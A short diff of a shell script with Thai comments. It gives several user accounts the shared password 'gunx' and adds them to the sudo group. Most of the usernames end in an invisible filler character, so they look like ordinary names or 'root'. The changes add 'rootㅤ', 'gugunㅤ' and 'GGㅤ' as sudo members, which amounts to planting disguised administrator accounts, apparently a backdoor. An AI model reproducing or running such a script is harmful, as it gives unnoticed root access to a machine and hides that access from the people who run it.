@@ -18,13 +18,13 @@ echo "gugunㅤ:gunx" | sudo chpasswd
 echo "GGㅤ:gunx" | sudo chpasswd
 echo "uiuiㅤ:gunx" | sudo chpasswd
 # เพิ่มผู้ใช้ gunx เข้าในกลุ่ม sudo
-sudo usermod -aG sudo rootx1
+sudo usermod -aG sudo rootㅤ
 sudo usermod -aG sudo rootx
 sudo usermod -aG sudo rootx2
 sudo usermod -aG sudo rootx3
-sudo usermod -aG sudo japanㅤ
-sudo usermod -aG sudo jjㅤ
+sudo usermod -aG sudo gugunㅤ
+sudo usermod -aG sudo GGㅤ
 sudo usermod -aG sudo uiuiㅤ
 # แสดงข้อความยืนยัน
-echo "ผู้ใช้ Testเริ่มชิบหาย ถูกสร้างและกำหนดสิทธิ์เรียบร้อยแล้ว"
+echo "ผู้ใช้ Test root ถูกสร้างและกำหนดสิทธิ์เรียบร้อยแล้ว"
 rm -f rootx
